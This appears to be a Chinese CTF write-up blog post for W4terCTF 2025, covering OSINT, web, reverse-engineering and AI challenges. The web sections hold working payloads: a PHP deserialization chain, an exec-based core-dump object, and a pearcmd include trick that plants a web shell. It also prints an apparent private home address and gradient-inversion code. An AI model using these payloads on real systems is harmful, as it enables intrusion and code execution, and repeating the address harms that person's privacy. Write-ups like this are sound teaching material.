\n        break\n\n    def xor_dword(offset, value):\n        pos = i + offset\n        val = struct.unpack_from('<I', s1, pos)[0]  \n        val ^= value\n        struct.pack_into('<I', s1, pos, val)\n\n    xor_dword(0, v2)\n    xor_dword(5, v3 + v2)\n    xor_dword(10, v6 + v2)\n    xor_dword(15, v4 + v2)\n\n    v2 += v5\n\n\nprint(f\"解密后的字节数据：\\n{s1}\")\n\n# 尝试以不同的编码解码\ntry:\n    result = s1.rstrip(b'\\x00').decode('utf-8')\n    print(f\"[+] 解密成功，flag/原文为：\\n{result}\")\nexcept UnicodeDecodeError:\n    print(\"[-] 解密失败，UTF-8 解码出错。尝试其他编码方式。\")\n    try:\n        result = s1.decode('latin1')\n        print(f\"[+] 使用 latin1 编码解密成功，flag/原文为：\\n{result}\")\n    except UnicodeDecodeError:\n        print(\"[-] 解密失败，latin1 解码出错。\")\n\n```\n\n![image-20250504172338683](image-20250504172338683.png)\n\n```\nFlag: W4terCTF{WHEN_yOUr_DReAMS_COME_AIivE_YoU'r3_Un5T0pp461E}\n```\n\n\n\n# AI\n\n## Gradient\n\nAI题先交给AI做，后面一定好好上创新实践训练课😭😭😭\n\n特别感谢出题人R1ck，因为深度学习的知识尚浅薄，靠R1ck提点才有今天的成功，也算是给这次比赛画上一个圆满的句号了。\n\n根据题目，找到参考的论文以及源代码。\n\n```python\n# 核心代码\ndef deep_leakage_from_gradients(model, origin_grad): \n  dummy_data = torch.randn(origin_data.size())\n  dummy_label =  torch.randn(dummy_label.size())\n  optimizer = torch.optim.LBFGS([dummy_data, dummy_label] )\n\n  for iters in range(300):\n    def closure():\n      optimizer.zero_grad()\n      dummy_pred = model(dummy_data) \n      dummy_loss = criterion(dummy_pred, F.softmax(dummy_label, dim=-1)) \n      dummy_grad = grad(dummy_loss, model.parameters(), create_graph=True)\n\n      grad_diff = sum(((dummy_grad - origin_grad) ** 2).sum() \\\n        for dummy_g, origin_g in zip(dummy_grad, origin_grad))\n      \n      grad_diff.backward()\n      return grad_diff\n    \n    optimizer.step(closure)\n    \n  return  dummy_data, dummy_label\n```\n\n恢复的方法大意是指：\n\n- 先随机初始化一个虚假的原始图像dummy_data和原始标签dummy_label\n- 用LBFGS优化器来优化dummy_data和dummy_label，让他们产生的梯度和原始的梯度越来越接近\n- 然后对dummy_data在神经网络上前向传播，用dummy_label作为目标衡量损失 loss\n- 计算dummy_data的梯度\n- 衡量dummy_grad和origin_grad的差异，然后对dummy_data和dummy_label反向传播来优化。\n- 最后返回输出和标签，还原原始样本。\n\n现有的文件是 model.pth 和一些 梯度文件 .grad\n\n```python\nimport torch\nimport torch.nn as nn\n# 占位模型类，用于加载（结构未知时也能绕过）\nclass R1ckNet(nn.Module):\n    def __init__(self):\n        super().__init__()\n\n# 加入到 safe_globals（新 PyTorch 安全机制）\nfrom torch.serialization import add_safe_globals\nadd_safe_globals({'R1ckNet': R1ckNet})\n \n \npthfile = r'E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth'            #.pth文件的路径\nmodel = torch.load(pthfile, map_location='cpu', weights_only=False)\nstate_dict = model.state_dict()   # 从模型对象中提取参数字典\nfor k, v in state_dict.items():\n    print(k, v.shape)\n\n#如果直接使用 torch.load 打印模型信息的话，会因为未知R1ckNet报错。\n#所以实例化一个类占位。\n```\n\n通过torch.load打印模型信息，输出了每个卷积层的权重以及全连接层的权重。\n\n- 卷积层权重：卷积核数量、输入通道数、卷积核大小。\n- 全连接层权重：输入与输出之间的连接。\n\n```python\n# 输出如下\n'''\nbody.0.weight torch.Size([12, 3, 5, 5])\nbody.0.bias torch.Size([12])\nbody.2.weight torch.Size([12, 12, 5, 5])\nbody.2.bias torch.Size([12])\nbody.4.weight torch.Size([12, 12, 5, 5])\nbody.4.bias torch.Size([12])\nbody.6.weight torch.Size([16, 12, 3, 3])\nbody.6.bias torch.Size([16])\nfc.0.weight torch.Size([100, 1024])\nfc.0.bias torch.Size([100])\n'''\n```\n\n拷打出题人后，发现对 .pth 文件挖掘不充分，进一步打印自定义类的超参数，得到一个hint\n\n```python\nimport argparse\nimport torch\nimport torch.nn as nn\nimport inspect\n\n# 如果你的模型类定义在某个模块里，请确保能 import 到它\n# 这里给出一个占位定义，实际加载时会使用 pickle 里的类定义\nclass R1ckNet(nn.Module):\n    def __init__(self, in_channels=3, conv1_out=12, conv2_out=12, conv3_out=12, conv4_out=16, fc_in=1024, num_classes=100):\n        super().__init__()\n        # 如果模型里定义了 hparams，它会在实例上\n        try:\n            self.hparams = {\n                \"in_channels\": in_channels,\n                \"conv1_out\": conv1_out,\n                \"conv2_out\": conv2_out,\n                \"conv3_out\": conv3_out,\n                \"conv4_out\": conv4_out,\n                \"fc_in\": fc_in,\n                \"num_classes\": num_classes,\n            }\n        except Exception:\n            pass\n        # 构建网络结构（可省略，仅为完整定义）\n        self.body = nn.Sequential(\n            nn.Conv2d(in_channels, conv1_out, 5, stride=2, padding=2), nn.Sigmoid(),\n            nn.Conv2d(conv1_out, conv2_out, 5, stride=2, padding=2), nn.Sigmoid(),\n            nn.Conv2d(conv2_out, conv3_out, 5, stride=1, padding=2), nn.Sigmoid(),\n            nn.Conv2d(conv3_out, conv4_out, 3, stride=1, padding=1), nn.Sigmoid(),\n            nn.Flatten()\n        )\n        self.fc = nn.Linear(fc_in, num_classes)\n\n    def forward(self, x):\n        x = self.body(x)\n        x = x.view(x.size(0), -1)\n        return self.fc(x)\n\n    def __repr__(self):\n        # 尝试打印 hparams，否则退回默认\n        if hasattr(self, 'hparams'):\n            params = \", \".join(f\"{k}={v}\" for k, v in self.hparams.items())\n            return f\"{self.__class__.__name__}({params})\"\n        else:\n            return super().__repr__()\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--pth', type=str, required=True,\n                        help='path to .pth file (whole-model or state_dict)')\n    args = parser.parse_args()\n\n    # 载入 .pth\n    loaded = torch.load(args.pth, map_location='cpu',weights_only=False)\n\n    # 判定类型\n    if isinstance(loaded, dict):\n        print(\"Detected state_dict. Instantiating R1ckNet and loading state_dict.\")\n        model = R1ckNet()\n        # 支持 checkpoint dict 包含 'model_state_dict'\n        sd = loaded.get('model_state_dict', loaded)\n        model.load_state_dict(sd)\n    else:\n        print(\"Detected full-model object. Using it directly.\")\n        model = loaded\n\n    model.eval()\n\n    # 1) 打印 repr（调用 __repr__）\n    print(\"\\n=== Model repr() ===\")\n    print(model)\n\n    # 2) 打印构造函数签名\n    sig = inspect.signature(model.__class__.__init__)\n    print(\"\\n=== Constructor signature ===\")\n    print(sig)\n\n    # 3) 如果有 hparams\n    if hasattr(model, 'hparams'):\n        print(\"\\n=== model.hparams ===\")\n        for k, v in model.hparams.items():\n            print(f\"  {k} = {v}\")\n    else:\n        print(\"\\nNo model.hparams attribute. Inspecting instance __dict__ for hyperparam-like entries...\")\n        for k, v in vars(model).items():\n            # 过滤模块和参数\n            if not isinstance(v, (nn.Module, nn.Parameter)) and not k.startswith('_'):\n                print(f\"  {k} = {v}\")\n\n    # 4) 列出所有参数名和形状\n    print(\"\\n=== model.named_parameters() ===\")\n    for name, param in model.named_parameters():\n        print(f\"{name:30s} | shape: {tuple(param.shape)}\")\n\n\nif __name__ == '__main__':\n    main()\n\n    \n# cmd line: python info.py --pth \"your.pth\"\n```\n\n![image-20250504203337339](image-20250504203337339.png)\n\n```\nhint: 7h3_84ck6r0und_0f_7h3_ch4r4c73r_1m463_15_wh173😝\n字符背景是白色的。\n```\n\n那么结合上述的神经网络的信息，就能导入梯度迭代恢复了。\n\n```python\n# -*- coding: utf-8 -*-\n# r1cknet_grad_attack.py\n# 单独训练某个样本\nimport argparse\nimport matplotlib.pyplot as plt\nimport torch\nimport torch.nn.functional as F\nfrom model import R1ckNet\nfrom utils import label_to_onehot, cross_entropy_for_onehot\nimport os\n\nparser = argparse.ArgumentParser(description='Deep Leakage from Gradients using R1ckNet.')\nparser.add_argument('--grad', type=str, required=True, help='Path to the .grad file')\nparser.add_argument('--out', type=str, default=None, help='Path to save recovered image')\nargs = parser.parse_args()\n\n\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nprint(\"Running on\", device)\n\n# 1. 加载原始梯度\nwith open(args.grad, 'rb') as f:\n    origin_grad = torch.load(f)\n\n# 2. 初始化模型并加载已有权重\n#net = R1ckNet().to(device)\n#这个也可以不用注释掉，就是和后面导入模型有点重复\n\n# 加载模型的state_dict\nnet = torch.load(r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth\", \n                 map_location=device,weights_only=False)\n\nnet.eval()\n\n# 3. 初始化 dummy 数据和标签\ndummy_data = torch.ones((1, 3, 32, 32), device=device, requires_grad=True)\n# 之前迭代损失很高就是因为没读懂提示，原来提示的作用是为了让初始化图像时尽可能接近恢复出的图像，这样就能降低损失。在比较少的迭代次数也能有效恢复。\n# 图片背景是白色，初始化为全白图像，即采用 torch.ones。\n# 之前一直模仿论文代码写的是 torch.rands，训练恢复的效果就很差。\ndummy_label = torch.randn((1, 100), device=device, requires_grad=True)\n\n# 使用 LBFGS 优化器\noptimizer = torch.optim.LBFGS([dummy_data, dummy_label])\nhistory = []\n\n# 4. 迭代优化以恢复图像和标签\nfor it in range(300):\n    def closure():\n        optimizer.zero_grad()\n        # 进行前向传播获取预测结果\n        pred = net(dummy_data)\n        #print(f\"Prediction shape: {pred.shape}\")  # 打印预测结果的形状\n\n        # 使用 softmax 转换标签为概率分布\n        soft_label = F.softmax(dummy_label, dim=-1)\n\n        # 计算交叉熵损失\n        loss = cross_entropy_for_onehot(pred, soft_label)\n\n        # 计算损失对模型参数的梯度\n        grads = torch.autograd.grad(loss, net.parameters(), create_graph=True)\n\n        # 计算恢复梯度与原始梯度之间的差异\n        diff = sum(((g_rec - g_orig) ** 2).sum() for g_rec, g_orig in zip(grads, origin_grad))\n        diff.backward()  # 反向传播计算差异的梯度\n\n        return diff\n\n    optimizer.step(closure)\n\n    if it % 10 == 0:\n        loss_val = closure().item()\n        print(f\"Iter {it:3d} | Loss: {loss_val:.4f}\")\n        history.append(dummy_data[0].detach().cpu())\n\n# 5. 可视化中间恢复图像\nplt.figure(figsize=(12, 8))\nfor i, img in enumerate(history[:30]):\n    plt.subplot(3, 10, i + 1)\n    plt.imshow(img.permute(1, 2, 0).clip(0, 1))\n    plt.title(f\"it={i * 10}\")\n    plt.axis('off')\nplt.tight_layout()\n\n# 自动命名图像文件\nif args.out:\n    plt.savefig(args.out)\nelse:\n    grad_filename = os.path.splitext(os.path.basename(args.grad))[0]  # 提取不带扩展名的文件名\n    out_path = f\"{grad_filename}.png\"\n    plt.savefig(out_path)\n    print(f\"Image saved to {out_path}\")\n\n\n# 6. 输出恢复标签\nwith torch.no_grad():\n    final_probs = F.softmax(dummy_label, dim=-1)\n    recovered_class = torch.argmax(final_probs, dim=-1).item()\nprint(\"Recovered class label:\", recovered_class)\n# 这个标签有大用，之前看到输出结果一直以为是迭代过程中一个比较突出的数值，还是学得太粗略了。\n```\n\n```python\n# model.py\nimport torch.nn as nn\n\nclass R1ckNet(nn.Module):\n    def __init__(self, in_channels=3, conv1_out=12, conv2_out=12, conv3_out=12,\n                 conv4_out=16, fc_in=1024, num_classes=100):\n        super().__init__()\n        self.body = nn.Sequential(\n            nn.Conv2d(in_channels, conv1_out, 5, stride=2, padding=2),\n            nn.Sigmoid(),\n            nn.Conv2d(conv1_out, conv2_out, 5, stride=2, padding=2),\n            nn.Sigmoid(),\n            nn.Conv2d(conv2_out, conv3_out, 5, stride=1, padding=2),\n            nn.Sigmoid(),\n            nn.Conv2d(conv3_out, conv4_out, 3, stride=1, padding=1),\n            nn.Sigmoid(),\n            nn.Flatten()\n        )\n        self.fc = nn.Linear(fc_in, num_classes)\n\n    def forward(self, x):\n        x = self.body(x)\n        x = x.view(x.size(0),-1)\n        # 展平这一步很重要，规范张量的形状以和权重矩阵的形状相匹配。感觉自己学习代码还是挺粗线条的💦💦💦\n        return self.fc(x)\n\n```\n\n```python \n# utils.py\n\nimport torch\nimport torch.nn.functional as F\n\n# 整数形式的分类标签转换为 One-Hot 编码。\n# dummy_label是可导的，转换one-hot方便计算和预测结果之间的损失\ndef label_to_onehot(target, num_classes=100):\n    target = torch.unsqueeze(target, 1)  # [B,1]\n    onehot = torch.zeros(target.size(0), num_classes, device=target.device)\n    onehot.scatter_(1, target, 1)\n    return onehot\n\n# 计算预测结果与 one-hot 标签之间的交叉熵损失。\ndef cross_entropy_for_onehot(pred, target):\n    return torch.mean(torch.sum(- target * F.log_softmax(pred, dim=-1), dim=1))\n\n```\n\n```python\n# -*- coding: utf-8 -*-\n# batch.py 批量训练梯度\nimport os\nimport torch\nimport torch.nn.functional as F\nimport matplotlib.pyplot as plt\nfrom model import R1ckNet\nfrom utils import cross_entropy_for_onehot\nfrom tqdm import tqdm  # 用于显示进度条\n\n# 配置参数\nGRAD_DIR = r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\grads_origin\"\nMODEL_PATH = r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth\"\nOUT_DIR = r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\outputs1\"\nos.makedirs(OUT_DIR, exist_ok=True)\n\n# 设备选择\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nprint(\"Running on\", device)\n\n# 加载模型\nnet = torch.load(MODEL_PATH, map_location=device,weights_only=False)\nnet.eval()\n\n# 遍历所有 .grad 文件\nfor grad_file in sorted(os.listdir(GRAD_DIR)):\n    if not grad_file.endswith(\".grad\"):\n        continue\n\n    grad_path = os.path.join(GRAD_DIR, grad_file)\n    out_name = os.path.splitext(grad_file)[0] + \".png\"\n    out_path = os.path.join(OUT_DIR, out_name)\n\n    # 加载原始梯度\n    with open(grad_path, 'rb') as f:\n        origin_grad = torch.load(f)\n\n    # 初始化 dummy 数据和标签\n    dummy_data = torch.ones((1, 3, 32, 32), device=device, requires_grad=True)\n    dummy_label = torch.randn((1, 100), device=device, requires_grad=True)\n\n    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])\n    history = []\n\n    # 迭代优化\n    for it in range(100):\n        def closure():\n            optimizer.zero_grad()\n            pred = net(dummy_data)\n            soft_label = F.softmax(dummy_label, dim=-1)\n            loss = cross_entropy_for_onehot(pred, soft_label)\n            grads = torch.autograd.grad(loss, net.parameters(), create_graph=True)\n            diff = sum(((g_rec - g_orig) ** 2).sum() for g_rec, g_orig in zip(grads, origin_grad))\n            diff.backward()\n            return diff\n\n        optimizer.step(closure)\n\n        if it %10 == 0:\n            loss_val = closure().item()\n            print(f\"Iter {it:3d} | Loss: {loss_val:.4f}\")\n            history.append(dummy_data[0].detach().cpu())\n\n    # 保存图像\n    plt.figure(figsize=(12, 8))\n    for i, img in enumerate(history[:30]):\n        plt.subplot(3, 10, i + 1)\n        plt.imshow(img.permute(1, 2, 0).clip(0, 1))\n        plt.title(f\"it={i * 10}\")\n        plt.axis('off')\n    plt.tight_layout()\n    plt.savefig(out_path)\n    plt.close()\n\n    # 输出标签（可选）\n    with torch.no_grad():\n        final_probs = F.softmax(dummy_label, dim=-1)\n        recovered_class = torch.argmax(final_probs, dim=-1).item()\n    print(f\"{grad_file} -> Class: {recovered_class}\")\n\n```\n\n\n\n然后就能预测图像了。\n\n注意预测过程中，有些图像会因为迭代次数过大而“矫枉过正”，所以针对某些损失依旧很大的图像可以适当降低迭代次数，单独进行训练。\n\n![image-20250504223254918](image-20250504223254918.png)\n\n最后恢复出了的图像如下：\n\n<img src=\"3.png\" alt=\"3\" style=\"zoom:25%;\" /><img src=\"1.png\" alt=\"1\" style=\"zoom:25%;\" /><img src=\"2.png\" alt=\"2\" style=\"zoom:25%;\" />\n\n<img src=\"31.png\" alt=\"31\" style=\"zoom:25%;\" /><img src=\"32.png\" alt=\"32\" style=\"zoom:25%;\" /><img src=\"4.png\" alt=\"4\" style=\"zoom:25%;\" />\n\n<img src=\"5.png\" alt=\"5\" style=\"zoom:25%;\" /><img src=\"6.png\" alt=\"6\" style=\"zoom:25%;\" /><img src=\"7.png\" alt=\"7\" style=\"zoom:25%;\" />\n\n<img src=\"8.png\" alt=\"8\" style=\"zoom:25%;\" /><img src=\"9.png\" alt=\"9\" style=\"zoom:25%;\" /><img src=\"10.png\" alt=\"10\" style=\"zoom:25%;\" />\n\n<img src=\"11.png\" alt=\"11\" style=\"zoom:25%;\" /><img src=\"12.png\" alt=\"12\" style=\"zoom:25%;\" /><img src=\"13.png\" alt=\"13\" style=\"zoom:25%;\" />\n\n<img src=\"14.png\" alt=\"14\" style=\"zoom:25%;\" /><img src=\"15.png\" alt=\"15\" style=\"zoom:25%;\" /><img src=\"16.png\" alt=\"16\" style=\"zoom:25%;\" />\n\n<img src=\"17.png\" alt=\"17\" style=\"zoom:25%;\" /><img src=\"18.png\" alt=\"18\" style=\"zoom:25%;\" /><img src=\"19.png\" alt=\"19\" style=\"zoom:25%;\" />\n\n<img src=\"20.png\" alt=\"20\" style=\"zoom:25%;\" /><img src=\"21.png\" alt=\"21\" style=\"zoom:25%;\" /><img src=\"22.png\" alt=\"22\" style=\"zoom:25%;\" />\n\n<img src=\"23.png\" alt=\"23\" style=\"zoom:25%;\" /><img src=\"24.png\" alt=\"24\" style=\"zoom:25%;\" /><img src=\"25.png\" alt=\"25\" style=\"zoom:25%;\" />\n\n<img src=\"26.png\" alt=\"26\" style=\"zoom:25%;\" /><img src=\"27.png\" alt=\"27\" style=\"zoom:25%;\" /><img src=\"28.png\" alt=\"28\" style=\"zoom:25%;\" />\n\n<img src=\"29.png\" alt=\"29\" style=\"zoom:25%;\" /><img src=\"30.png\" alt=\"30\" style=\"zoom:25%;\" />\n\n数据处理的比较乱。。。\n\n恢复出来发现并不是顺序可读的flag。\n\n想到了用时间判断梯度生成的先后，结果发现精确到毫秒级所有样本都是一模一样的。然后问ai说可以通过损失判断训练的先后，因为损失一般是收敛的，但并没有观察出什么规律。又莫名其妙发现.grad可以解压，有个serialization_id，还以为和梯度顺序有关，但其实只是训练设备的标号。最后才知道顺序和标签有关——\n\n（又重新训了一遍数据看标签的值）\n\n```python \n# 6. 输出恢复标签\nwith torch.no_grad():\n    final_probs = F.softmax(dummy_label, dim=-1)\n    recovered_class = torch.argmax(final_probs, dim=-1).item()\nprint(\"Recovered class label:\", recovered_class)\n```\n\n这个标签代表了梯度的顺序。\n\n需要注意的是，如果迭代时损失比较大，可能就不能使标签收敛到正确的值。所以也需要再调整迭代次数重新训练。\n\n因为数据处理的比较乱，则列了一个表格记录标签值\n\n![image-20250504224517508](image-20250504224517508.png)\n\n最后一个样本在恢复标签值时始终找不到合适的迭代次数，但好在通过标签值排序后已经恢复出了flag的大意：R1ck likes ai security，所以便没有重新训练该样本。\n\n历经千辛万苦得到了flag：\n\n```\nFlag: W4terCTF{R1ck_iik35_41_53cur17y}\n```\n\n虽然课没好好上，但是通过这次ai安全的题目感觉把之前欠的都补回来了。\n\n# 小结\n\n在比赛中的成长只有靠写WP才能沉淀。但是太拖延了几乎比完赛才开始动笔写。\n\n虽然只能做做简单题，但是能坚持在五一打比赛已经很了不起了😭😭👍\n\n相比去年只做出一道题，今年进步也算不小了，虽然有不少的功劳出自ai和出题人。（出题人们真的好强，真是学到了不少东西）\n\n感谢队友的鼎力相助，看到队友能挑战pwn题和hard题——仰慕.jpg\n\n比赛过的很快，五一也过得很快。是时候该补作业了。\n\n## 后记\n压线过二等。\n\n![alt text](list.png)","source":"_posts/W4terCTF-2025.md","raw":"---\ntitle: W4terCTF 2025\ndate: 2025-05-13 19:33:14\ntags: CTF\nexcerpt: 拼尽全力。\n---\n\n\n\n# OSINT\n\n非常好玩的图寻题，但充分暴露出地理常识为0。幸运地抢了个三血。\n\n## 海的那边是\n\nPOV：**羡慕出题人在海边度假**\n\n\n\n\n![alt text](微信图片_20250503193131.jpg)\n\n\n因为对出题人在群里说正在San Diego的印象比较深，马上定位图片位置大概就是La Jolla。\n\n### task1\n\n保存图片后查看图片属性\n\n\n![alt text](image-20250503175742770.png)\nans：<u>**20250427**</u>\n\n\n\n### task3 \n\n\n![alt text](微信图片_20250503193419.png)\n\n先定位到建筑的位置会更方便做剩下几问，于是打开谷歌识图：\n发现了一模一样的建筑，连水管和猫头鹰装饰都一模一样！\n\n\n![alt text](微信图片_20250503193140.png)\n\n打开作者主页：\n\n![微信图片_20250503193150](微信图片_20250503193150.png)\n\n\n\n其他图片显示的内容也佐证了这一点，<u>在海边</u>。\n\n本来想在谷歌地图里面暴走一圈找到这个建筑来着，但是太暴力了点。\n\n又想去其他社交平台找这个作者，但是没什么发现。不过意外发现了这个作者的住址：***Jeremiah Regner, located at 9505 Gold Coast Dr Apt 98, San Diego, CA*.**\n\n![微信图片_20250503193205](微信图片_20250503193205.png)\n\n地点极其符合——在谷歌地图定位这个地址：\n\n![微信图片_20250503193217](微信图片_20250503193217.jpg)\n\n先在作者家附近的海岸找，果然找到了：\n\n![微信图片_20250503193223](微信图片_20250503193223.png)\n\n在地图上走啊走，就走到了：\n\n![微信图片_20250503194002](微信图片_20250503194002.png)\n\nans：<u>**Hubbs Hall**</u>\n\n\n\n### task2\n\n谷歌地图上是有充电头信息的，但是找不到，绷🤣\n\n不过好在有很多充电桩分布的网站提供信息。\n\n![微信图片_20250503194142](微信图片_20250503194142.png)\n\nans：<u>**J1772**</u>\n\n\n\n### task4\n\nez，随便找个出发点，最后都要坐30路公交。\n\n![微信图片_20250503194610](微信图片_20250503194610.png)\n\nans：<u>**30**</u>\n\n\n\n### task5\n\nHubbs Hall旁边的潮汐监测点在 Sccripps Pier，其站点编号是9410230。\n\n找到相关数据网站就有了。\n\n![微信图片_20250503195311](微信图片_20250503195311.png)\n\n图中数据即是5月7号的海浪预测峰值\n\np.s.：因为这里死活填不对，拷打了下出题人，出题人说可以ft转cm可以先舍去小数部分再计算，4ft算出来四舍五入是122，但是正确答案是121🥲。（原来保留整数就真的只是保留整数（部分）。。）\n\n以及不同网站的预测数据不太一样，有点搞......\n\nans：<u>**122 or 143**</u>\n\n### task6\n\n不学地理是这样的，☝️🤓可以算出海浪峰值周期40000多秒。\n\n找到现成的数据就好了：\n\n![微信图片_20250503200140](微信图片_20250503200140.png)\n\nans：<u>**10**</u>\n\n\n\n### flag\n\n![微信图片_20250503200530](微信图片_20250503200530.png)\n\n```\nFlag: W4terCTF{Sc1ENc3_UndOUBTEd1Y_IMMorT4I_5EA_Un4R9U481y_IlLumln4tlnG}\n```\n\n\n\n# WEB\n\n## Core Dump Error（签到题）\n\n半夜误打误撞做出来了。\n\n原来视频里面的issue只是被close而不是被delete了 hhh。\n\n只要找到相关issue的POC链然后改一下exec执行的命令就好了\n\n```json\n{\n    \"objects\": {\n      \"1\": {\n        \"type\": \"frame\",\n        \"attrs\": {\n          \"f_lineno\": \"11\",\n          \"f_locals\": \"12\",\n          \"f_code\": \"13\",\n          \"f_globals\": \"14\",\n          \"f_back\": \"15\"\n        }\n      },\n      \"11\": {\n        \"type\": \"int\",\n        \"value\": 1\n      },\n      \"12\": {\n        \"type\": \"dict\",\n        \"value\": {}\n      },\n      \"13\": {\n        \"type\": \"code\",\n        \"attrs\": {\n          \"co_filename\": \"131\",\n          \"co_name\": \"132\"\n        }\n      },\n      \"14\": {\n        \"type\": \"dict\",\n        \"value\": {\n          \"141\": \"143\",\n          \"142\": \"144\"\n        }\n      },\n      \"15\": {\n        \"type\": \"NoneType\"\n      },\n      \"131\": {\n        \"type\": \"str\",\n        \"value\": \"filename\"\n      },\n      \"132\": {\n        \"type\": \"str\",\n        \"value\": \"name\"\n      },\n      \"141\": {\n        \"type\": \"str\",\n        \"value\": \"__name__\"\n      },\n      \"142\": {\n        \"type\": \"str\",\n        \"value\": \"__loader__\"\n      },\n      \"143\": {\n        \"type\": \"str\",\n        \"value\": \"print(open('/tmp/flag').read())\"\n      },\n      \"144\": {\n        \"type\": \"EvilLoader\",\n        \"attrs\": {\n          \"get_source\": \"1441\"\n        }\n      },\n      \"1441\": {\n        \"type\": \"builtin_function\",\n        \"value\": \"exec\"\n      }\n    },\n    \"threads\": {\n      \"0\": {\n        \"frame\": \"1\"\n      }\n    },\n    \"current_thread\": \"0\",\n    \"files\": {},\n    \"metadata\": {\n      \"version\": \"0.4.0\"\n    }\n  }\n\n```\n\n![微信图片_20250505110938](微信图片_20250505110938.png)\n\n```\nFlag: W4terCTF{c0N9ra7u1ATIonS_0N_hacK1nG_A_pRoGraM_foR_TH3_1IrSt_t1Me}\n```\n\n\n\n## Happy PHP\n\n### part1\n\n阅读php代码，梳理逻辑如下：\n\n- 如果url中传递了参数  gogogo ，该对象就会被反序列化。\n- 反序列化的对象会触发魔术方法__wakeup()，并返回gogogo的结果。\n- 如果触发phpis 类的__invoke()方法，则执行fun1(fun2())，并通过eval()函数执行代码。返回结果 == 'Yelia'的话，就调用 what->saying。\n\n- 要调用piece1->here()，必须让 $flag 的 MD5 值等于 md5(666)。\n\n- 如果两个不同的变量 $sy 和 $su 的 MD5 和 SHA1相等，就能echo fl491.txt。\n\n通过构造反序列化的POP链，获得payload\n\n```php\n<?php\nclass phpis {\n    public $what;\n    public $fun1;\n    public $fun2;\n    function __invoke() { \n        if (preg_match('/^[a-z0-9]+$/', $this->fun1) ){\n        if(preg_match('/^[a-z0-9]+$/', $this->fun2)) {\n                $flag = eval(\"return $this->fun1($this->fun2());\");\n                if(intval($flag) == 'Yelia'){\n                    $this->what->saying();\n                } else {\n                    die(\"nonono ,please try again !!\");\n                }            \n            }\n        }\n    }\n}\n\nclass thebest {\n    public $gogogo;\n}\n\nclass language {\n    public $v1;\n    public $piece1;\n}\n\nclass right {\n    public $sy;\n    public $su;\n}\n\n\n$right = new right();\n$right->sy = [1];\n$right->su = [2]; \n\n$lang = new language();\n$lang->v1 = \"flag=\" . md5(666);\n$lang->piece1 = $right;\n\n$phpis = new phpis();\n$phpis->what = $lang;\n$phpis->fun1 = \"strlen\"; \n$phpis->fun2 = \"strrev\";\n\n$best = new thebest();\n$best->gogogo = $phpis;\n\n$payload = serialize($best);\necho \"payload：\\n\\n\";\necho urlencode($payload) . \"\\n\";\n?>\n\n//payload: ?gogogo=O%3A7%3A%22thebest%22%3A1%3A%7Bs%3A6%3A%22gogogo%22%3BO%3A5%3A%22phpis%22%3A3%3A%7Bs%3A4%3A%22what%22%3BO%3A8%3A%22language%22%3A2%3A%7Bs%3A2%3A%22v1%22%3Bs%3A37%3A%22flag%3Dfae0b27c451c728867a567e8c1bb4e53%22%3Bs%3A6%3A%22piece1%22%3BO%3A5%3A%22right%22%3A2%3A%7Bs%3A2%3A%22sy%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A2%3A%22su%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D%7D%7Ds%3A4%3A%22fun1%22%3Bs%3A6%3A%22strlen%22%3Bs%3A4%3A%22fun2%22%3Bs%3A6%3A%22strrev%22%3B%7D%7D    \n    \n```\n\n![微信图片_20250503204222](微信图片_20250503204222.png)\n\n```flag\nFlag_piece_1: W4terCTF{i5_pHp\n```\n\n### part2\n\n进到 /1nCLud3.php 目录下\n\n根据源码，需要构造参数file，同时又要绕过正则匹配。试了很多种绕过都不太行，虽然$_SERVER['QUERY_STRING']在匹配的时候不会进行url解码，但是同样include打开文件的时候也不会进行url解码，试图构造用url编码方式绕过正则匹配的方式就行不通。\n\n根据提示：register_argc_argv=On，找到博客[register_argc_argv与include to RCE的巧妙组合 - Longlone's Blog](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合/)\n\n和这道题的思路非常像，所以仿照博客中的解题思路，利用pearcmd执行rce：\n\n“当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在registerargcargv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER['argv']来执行pear命令。”\n\n```payload\n?file=pearcmd&+config-create+/<?phpsystem($_GET['cmd']);?>+/tmp/evil.php\n```\n\n因为浏览器会将< ? > 转义，所以通过burpsuite抓包后再GET传参\n\n![微信图片_20250504135809](微信图片_20250504135809.png)\n\n\n\n这便拿到了cmd的控制权，随后查找剩下的flag\n\n通过include打开evil.php继续利用cmd\n\n```payload\n?file=/tmp/evil&cmd=ls /tmp\n```\n\n![微信图片_20250504140529](微信图片_20250504140529.png)\n\n\n\n再配合通配符绕过一下\n\n```payload\n?file=/tmp/evil&cmd=cat /tmp/f*lag2.txt\n```\n\n![微信图片_20250504140829](微信图片_20250504140829.png)\n\n```\nFlag_piece2: _The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!}\n```\n\n```\nFlag: W4terCTF{i5_pHp_The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!}\n```\n\n\n\n##  Front End\n\n密码的web题\n\n![微信图片_20250504155416](微信图片_20250504155416.png)\n\n\n\nbase64编码\n\n![微信图片_20250504155524](微信图片_20250504155524.png)\n\n![微信图片_20250504155559](微信图片_20250504155559.png)\n\n\n\n打开 /hint.html\n\n![微信图片_20250504155659](微信图片_20250504155659.png)\n\n\n\n看到注释——JavaScript 混淆表达式。在控制台运行一下，得到encode.php\n\n![微信图片_20250504155944](微信图片_20250504155944.png)\n\n\n\n来到密码的部分\n\n根据\n\n![微信图片_20250504160243](微信图片_20250504160243.png)\n\n这一部分的判断逻辑，如果变量 rand 等于0 就输出加密后的内容。\n\n根据 rand 的定义，传递参数 r = 1537101982\n\n得到了调用两次encrypt的加密结果：\n\n```\nEncrypted: 